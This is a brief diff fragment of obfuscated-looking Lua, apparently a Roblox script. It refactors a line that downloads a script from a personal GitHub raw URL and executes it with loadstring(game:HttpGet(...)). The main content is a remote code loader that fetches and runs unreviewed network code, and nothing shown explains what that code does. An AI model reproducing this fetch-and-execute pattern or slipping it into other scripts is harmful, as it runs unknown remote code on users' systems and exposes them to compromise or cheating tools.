@@ -207,6 +207,7 @@
                 end)}
             e[2](8832)
         end) {}
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/ThanhTuoi852123/bugfestivebean/main/test.lua")) {}
+        c = "https://raw.githubusercontent.com/ThanhTuoi852123/bugfestivebean/main/test.lua"
+        loadstring(game:HttpGet(c)) {}
     end
 )
